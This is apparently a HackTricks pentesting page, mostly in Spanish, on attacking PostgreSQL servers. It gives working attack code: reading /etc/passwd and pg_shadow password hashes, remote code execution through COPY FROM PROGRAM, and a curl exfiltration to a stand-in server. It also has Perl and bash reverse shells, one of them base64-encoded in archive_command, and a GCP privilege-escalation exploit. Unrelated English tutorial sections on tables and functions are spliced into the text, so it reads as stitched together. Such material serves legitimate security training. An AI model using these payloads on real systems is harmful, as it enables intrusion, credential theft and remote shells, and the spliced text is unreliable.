# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar f√°cilmente flujos de trabajo con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci√≥n b√°sica**

**PostgreSQL** es un sistema de base de datos relacional de c√≥digo abierto que utiliza y ampl√≠a el lenguaje SQL.

**Puerto predeterminado:** 5432, y si este puerto ya est√° en uso, parece que postgresql utilizar√° el siguiente puerto (probablemente 5433) que no est√° en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexi√≥n y Enumeraci√≥n B√°sica

### Conexi√≥n

Para realizar pruebas de penetraci√≥n en PostgreSQL, primero debemos establecer una conexi√≥n con el servidor de la base de datos. Podemos utilizar la herramienta `psql` para conectarnos a la base de datos PostgreSQL desde la l√≠nea de comandos.

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

Donde:
- `<host>` es la direcci√≥n IP o el nombre de dominio del servidor PostgreSQL.
- `<port>` es el n√∫mero de puerto en el que se est√° ejecutando el servidor PostgreSQL (por defecto es 5432).
- `<username>` es el nombre de usuario para autenticarse en el servidor PostgreSQL.
- `<database>` es el nombre de la base de datos a la que queremos conectarnos.

### Enumeraci√≥n B√°sica

Una vez que nos hemos conectado con √©xito al servidor PostgreSQL, podemos realizar una enumeraci√≥n b√°sica para obtener informaci√≥n sobre la base de datos y los usuarios.

#### Enumerar bases de datos

Podemos listar todas las bases de datos disponibles utilizando el siguiente comando SQL:

```sql
SELECT datname FROM pg_database;
```

Esto nos mostrar√° una lista de todas las bases de datos presentes en el servidor PostgreSQL.

#### Enumerar usuarios

Podemos obtener una lista de todos los usuarios de la base de datos utilizando el siguiente comando SQL:

```sql
SELECT usename FROM pg_user;
```

Esto nos mostrar√° una lista de todos los usuarios presentes en la base de datos.

#### Enumerar tablas

Podemos obtener una lista de todas las tablas en una base de datos espec√≠fica utilizando el siguiente comando SQL:

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public';
```

Esto nos mostrar√° una lista de todas las tablas presentes en la base de datos especificada.

#### Enumerar columnas

Podemos obtener una lista de todas las columnas en una tabla espec√≠fica utilizando el siguiente comando SQL:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>';
```

Reemplaza `<table_name>` con el nombre de la tabla de la que deseas enumerar las columnas. Esto nos mostrar√° una lista de todas las columnas presentes en la tabla especificada.

### Conclusiones

La conexi√≥n y la enumeraci√≥n b√°sica son los primeros pasos para realizar pruebas de penetraci√≥n en PostgreSQL. Estas t√©cnicas nos permiten obtener informaci√≥n valiosa sobre la base de datos y los usuarios, lo que nos ayudar√° en las etapas posteriores del proceso de pentesting.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`**, sabes que est√°s dentro de una base de datos de **PostgreSQL de AWS**.
{% endhint %}

Para obtener m√°s informaci√≥n sobre **c√≥mo abusar de una base de datos PostgreSQL**, consulta:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumeraci√≥n autom√°tica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Escaneo de puertos**

Seg√∫n [**esta investigaci√≥n**](https://www.exploit-db.com/papers/13084), cuando un intento de conexi√≥n falla, `dblink` arroja una excepci√≥n `sqlclient_unable_to_establish_sqlconnection` que incluye una explicaci√≥n del error. A continuaci√≥n se muestran ejemplos de estos detalles.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* El host est√° ca√≠do

`DETALLE: no se pudo conectar al servidor: No hay ruta hacia el host ¬øEl servidor se est√° ejecutando en el host "1.2.3.4" y aceptando conexiones TCP/IP en el puerto 5678?`

* El puerto est√° cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* El puerto est√° abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Introduction

PostgreSQL is an open-source relational database management system (RDBMS) that is widely used in web applications. As a pentester, it is important to understand how to test the security of PostgreSQL installations to identify vulnerabilities and potential attack vectors.

## Enumeration

### Port Scanning

To identify PostgreSQL installations on a target network, you can perform a port scan using tools like Nmap. By scanning for open ports, you can determine if PostgreSQL is running on the target system.

```bash
nmap -p 5432 <target_ip>
```

### Banner Grabbing

Once you have identified a PostgreSQL installation, you can perform banner grabbing to gather information about the version and configuration of the database server. This can help you identify potential vulnerabilities that are specific to the version being used.

```bash
nc -vn <target_ip> 5432
```

## Exploitation

### Default Credentials

PostgreSQL installations often come with default credentials that are not changed by administrators. It is important to test for default credentials to see if you can gain unauthorized access to the database.

### SQL Injection

SQL injection is a common vulnerability that can be exploited in PostgreSQL. By injecting malicious SQL queries into user input fields, an attacker can manipulate the database and potentially gain unauthorized access or extract sensitive information.

### Privilege Escalation

If you are able to gain access to a PostgreSQL database with limited privileges, you can attempt to escalate your privileges to gain administrative access. This can be done by exploiting vulnerabilities in the database or by leveraging misconfigurations in the system.

## Conclusion

Pentesting PostgreSQL installations is an important part of assessing the security of web applications. By understanding the enumeration and exploitation techniques outlined in this chapter, you can identify and exploit vulnerabilities in PostgreSQL to improve the overall security of your target network.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* El puerto est√° abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Desafortunadamente, no parece haber una forma de obtener los detalles de la excepci√≥n dentro de una funci√≥n PL/pgSQL. Pero puedes obtener los detalles si puedes conectarte directamente al servidor PostgreSQL. Si no es posible obtener nombres de usuario y contrase√±as directamente de las tablas del sistema, el ataque de lista de palabras descrito en la secci√≥n anterior podr√≠a tener √©xito.

## Enumeraci√≥n de privilegios

### Roles

| Tipos de roles |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                             |
| rolinherit     | El rol hereda autom√°ticamente los privilegios de los roles de los que es miembro                                                                     |
| rolcreaterole  | El rol puede crear m√°s roles                                                                                                                         |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                    |
| rolcanlogin    | El rol puede iniciar sesi√≥n. Es decir, este rol puede ser utilizado como identificador de autorizaci√≥n de sesi√≥n inicial                              |
| rolreplication | El rol es un rol de replicaci√≥n. Un rol de replicaci√≥n puede iniciar conexiones de replicaci√≥n y crear y eliminar espacios de replicaci√≥n.           |
| rolconnlimit   | Para roles que pueden iniciar sesi√≥n, esto establece el n√∫mero m√°ximo de conexiones simult√°neas que este rol puede realizar. -1 significa sin l√≠mite. |
| rolpassword    | No es la contrase√±a (siempre se muestra como `********`)                                                                                              |
| rolvaliduntil  | Hora de caducidad de la contrase√±a (solo se utiliza para la autenticaci√≥n de contrase√±a); nulo si no hay caducidad                                   |
| rolbypassrls   | El rol omite todas las pol√≠ticas de seguridad a nivel de fila, consulte [Secci√≥n 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para obtener m√°s informaci√≥n. |
| rolconfig      | Valores predeterminados espec√≠ficos del rol para las variables de configuraci√≥n en tiempo de ejecuci√≥n                                               |
| oid            | ID del rol                                                                                                                                           |

#### Grupos interesantes

* Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
* Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
* Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

{% hint style="info" %}
Ten en cuenta que en Postgres un **usuario**, un **grupo** y un **rol** son lo **mismo**. Solo depende de **c√≥mo lo uses** y si lo **permites iniciar sesi√≥n**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas

PostgreSQL uses tables to store data. A table is a collection of rows, where each row represents a record and each column represents a field or attribute of that record.

To view the tables in a PostgreSQL database, you can use the following SQL query:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```

This query retrieves the names of all tables in the public schema of the database.

### Creating Tables

To create a new table in PostgreSQL, you can use the `CREATE TABLE` statement. Here's an example:

```sql
CREATE TABLE employees (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    age INTEGER,
    salary DECIMAL(10, 2)
);
```

This statement creates a table named `employees` with four columns: `id`, `name`, `age`, and `salary`. The `id` column is defined as a serial primary key, which means it will automatically generate a unique value for each new row.

### Modifying Tables

You can modify an existing table in PostgreSQL using the `ALTER TABLE` statement. Here are some common modifications you can make:

- Adding a new column:

```sql
ALTER TABLE employees ADD COLUMN email VARCHAR(100);
```

- Modifying a column's data type:

```sql
ALTER TABLE employees ALTER COLUMN age TYPE SMALLINT;
```

- Renaming a column:

```sql
ALTER TABLE employees RENAME COLUMN name TO full_name;
```

### Dropping Tables

To delete a table from a PostgreSQL database, you can use the `DROP TABLE` statement. Here's an example:

```sql
DROP TABLE employees;
```

This statement will permanently delete the `employees` table and all its data.

### Conclusion

Tables are a fundamental component of PostgreSQL databases. Understanding how to view, create, modify, and delete tables is essential for effective database management.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages such as SQL, PL/pgSQL, Python, etc.

#### Creating Functions

To create a function in PostgreSQL, you can use the `CREATE FUNCTION` statement followed by the function name, input parameters (if any), return type, and the code block enclosed in a `BEGIN` and `END` block. Here is the syntax:

```sql
CREATE FUNCTION function_name (parameter1 datatype, parameter2 datatype, ...)
  RETURNS return_type
  LANGUAGE language_name
AS $$
  -- Function code goes here
$$;
```

#### Example

Let's create a simple function that calculates the square of a given number:

```sql
CREATE FUNCTION square(num integer)
  RETURNS integer
AS $$
BEGIN
  RETURN num * num;
END;
$$;
```

In the above example, we have created a function named `square` that takes an integer parameter `num` and returns an integer. The function code multiplies the input parameter `num` by itself and returns the result.

#### Calling Functions

Once a function is created, you can call it by using its name followed by the input parameters (if any). Here is the syntax:

```sql
SELECT function_name(parameter1, parameter2, ...)
```

Using the `square` function we created earlier, we can call it as follows:

```sql
SELECT square(5);
```

This will return the square of 5, which is 25.

#### Conclusion

Functions in PostgreSQL are powerful tools that allow you to encapsulate reusable code and perform specific tasks. They can be created using the `CREATE FUNCTION` statement and called using the `SELECT` statement.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones en el sistema de archivos

### Leer directorios y archivos

A partir de este [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y los **superusuarios** pueden utilizar el m√©todo **`COPY`** en cualquier ruta (verificar `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes los permisos **CREATEROLE**, puedes **convertirte en miembro de ese grupo:**
```sql
GRANT pg_read_server_files TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Existen **otras funciones de postgres** que se pueden utilizar para **leer archivos o listar un directorio**. Solo los **superusuarios** y los **usuarios con permisos expl√≠citos** pueden utilizarlas:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **m√°s funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura de archivos simple

Solo los **super usuarios** y los miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes los permisos **`CREATEROLE`**, puedes **convertirte en miembro de ese grupo:**
```sql
GRANT pg_write_server_files TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#escalada-de-privilegios-con-createrole)
{% endhint %}

Recuerda que COPY no puede manejar caracteres de nueva l√≠nea, por lo tanto, incluso si est√°s usando una carga √∫til en base64, **debes enviar una sola l√≠nea**.\
Una limitaci√≥n muy importante de esta t√©cnica es que **`copy` no se puede utilizar para escribir archivos binarios ya que modifica algunos valores binarios**.

### **Carga de archivos binarios**

Sin embargo, hay **otras t√©cnicas para cargar archivos binarios grandes:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Consejo de recompensa por errores**: **reg√≠strate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE a programa**

Desde la [versi√≥n 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo los **superusuarios** y los miembros del grupo **`pg_execute_server_program`** pueden usar copy para RCE (ejemplo con exfiltraci√≥n:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ejemplo para ejecutar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes los permisos **`CREATEROLE`**, puedes **convertirte en miembro de ese grupo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#escalada-de-privilegios-con-createrole)
{% endhint %}

O utiliza el m√≥dulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
M√°s informaci√≥n sobre esta vulnerabilidad [**aqu√≠**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque se inform√≥ como CVE-2019-9193, Postges declar√≥ que esto era una [caracter√≠stica y no se corregir√°](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con Lenguajes de PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE con extensiones de PostgreSQL

Una vez que hayas **aprendido** del post anterior **c√≥mo cargar archivos binarios**, puedes intentar obtener **RCE cargando una extensi√≥n de PostgreSQL y carg√°ndola**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE en el archivo de configuraci√≥n de PostgreSQL

El **archivo de configuraci√≥n** de PostgreSQL es **editable** por el usuario **postgres**, que es el que ejecuta la base de datos, por lo que como **superusuario** puedes escribir archivos en el sistema de archivos y, por lo tanto, puedes **sobrescribir este archivo**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE con ssl\_passphrase\_command**

El archivo de configuraci√≥n tiene algunos atributos interesantes que pueden llevar a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ruta de la clave privada de la base de datos.
* `ssl_passphrase_command = ''` Si el archivo privado est√° protegido por contrase√±a (cifrado), PostgreSQL **ejecutar√° el comando indicado en este atributo**.
* `ssl_passphrase_command_supports_reload = off` **Si** este atributo est√° **activado**, el **comando** se ejecutar√° si la clave est√° protegida por contrase√±a cuando se **ejecute** `pg_reload_conf()`.

Entonces, un atacante deber√°:

1. **Extraer la clave privada** del servidor.
2. **Cifrar** la clave privada descargada:
   `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Extraer** la **configuraci√≥n** actual de PostgreSQL.
5. **Sobrescribir** la **configuraci√≥n** con la configuraci√≥n de los atributos mencionados:
   `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

Al probar esto, not√© que solo funcionar√° si el **archivo de clave privada tiene permisos 640**, es **propiedad de root** y del **grupo ssl-cert o postgres** (para que el usuario postgres pueda leerlo) y se encuentra en _/var/lib/postgresql/12/main_.

**M√°s** [**informaci√≥n sobre esta t√©cnica aqu√≠**](https://pulsesecurity.co.nz/articles/postgres-sqli)**.**

#### **RCE con archive\_command**

Otro atributo en el archivo de configuraci√≥n que se puede explotar es `archive_command`.

Para que esto funcione, la configuraci√≥n `archive_mode` debe ser `'on'` o `'always'`. Si eso es cierto, entonces podr√≠amos sobrescribir el comando en `archive_command` y forzar su ejecuci√≥n a trav√©s de las operaciones de WAL (write-ahead logging).

Los pasos generales son:

1. Verificar si el modo de archivo est√° habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescribir `archive_command` con el payload. Por ejemplo, un reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recargar la configuraci√≥n: `SELECT pg_reload_conf()`
4. Forzar la ejecuci√≥n de la operaci√≥n WAL, que llamar√° al comando de archivo: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` para algunas versiones de Postgres

**M√°s** [**informaci√≥n sobre esta configuraci√≥n y sobre WAL aqu√≠**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

## **Elevaci√≥n de privilegios en Postgres**

### Elevaci√≥n de privilegios CREATEROLE

#### **Conceder**

Seg√∫n la [**documentaci√≥n**](https://www.postgresql.org/docs/13/sql-grant.html): _Los roles que tienen el privilegio **`CREATEROLE`** pueden **conceder o revocar la membres√≠a en cualquier rol** que **no sea** un **superusuario**._

Entonces, si tienes el permiso **`CREATEROLE`**, podr√≠as otorgarte acceso a otros **roles** (que no sean superusuario) que pueden darte la opci√≥n de leer y escribir archivos y ejecutar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Contrase√±a

Los usuarios con este rol tambi√©n pueden **cambiar** las **contrase√±as** de otros **no superusuarios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Escalaci√≥n de privilegios a SUPERUSER

Es bastante com√∫n encontrar que los **usuarios locales pueden iniciar sesi√≥n en PostgreSQL sin proporcionar ninguna contrase√±a**. Por lo tanto, una vez que hayas obtenido **permisos para ejecutar c√≥digo**, puedes abusar de estos permisos para obtener el rol de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Esto suele ser posible debido a las siguientes l√≠neas en el archivo **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

En [este **informe**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica c√≥mo fue posible realizar una **escalada de privilegios** en Postgres GCP abusando del privilegio ALTER TABLE que se le otorg√≥ al usuario.

Cuando intentas **hacer que otro usuario sea propietario de una tabla**, deber√≠as recibir un **error** que lo impida, pero aparentemente GCP le dio esa **opci√≥n al usuario postgres que no es superusuario** en GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Uniendo esta idea con el hecho de que cuando se ejecutan los comandos **INSERT/UPDATE/ANALYZE** en una **tabla con una funci√≥n de √≠ndice**, la **funci√≥n** se **llama** como parte del comando con los **permisos del propietario de la tabla**. Es posible crear un √≠ndice con una funci√≥n y dar permisos de propietario a un **superusuario** sobre esa tabla, y luego ejecutar ANALYZE sobre la tabla con la funci√≥n maliciosa que podr√° ejecutar comandos porque est√° utilizando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explotaci√≥n

1. Crear una nueva tabla.
2. Insertar contenido ficticio en la tabla para que la funci√≥n de √≠ndice tenga algo con lo que trabajar.
3. Crear una funci√≥n de √≠ndice maliciosa (con nuestra carga √∫til de ejecuci√≥n de c√≥digo) en la tabla.
4. ALTERAR el propietario de la tabla a cloudsqladmin, el rol de superusuario de GCP utilizado solo por Cloud SQL para mantener y gestionar la base de datos.
5. ANALIZAR la tabla, forzando al motor de PostgreSQL a cambiar al contexto de usuario del propietario de la tabla (cloudsqladmin) y llamar a la funci√≥n de √≠ndice maliciosa con los permisos de cloudsqladmin, lo que resulta en la ejecuci√≥n de nuestro comando de shell, al cual no ten√≠amos permiso para ejecutar anteriormente.

En PostgreSQL, este flujo se ve algo as√≠:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Despu√©s de ejecutar la consulta de explotaci√≥n SQL, la tabla `shell_commands_results` contiene la salida del c√≥digo ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Inicio de sesi√≥n local

Algunas instancias de postgresql mal configuradas podr√≠an permitir el inicio de sesi√≥n de cualquier usuario local, es posible hacerlo desde 127.0.0.1 utilizando la funci√≥n **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Ten en cuenta que para que la consulta anterior funcione **debe existir la funci√≥n `dblink`**. Si no existe, puedes intentar crearla con
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Si tienes la contrase√±a de un usuario con m√°s privilegios, pero el usuario no tiene permitido iniciar sesi√≥n desde una IP externa, puedes usar la siguiente funci√≥n para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible verificar si esta funci√≥n existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funci√≥n definida por el usuario con** SECURITY DEFINER

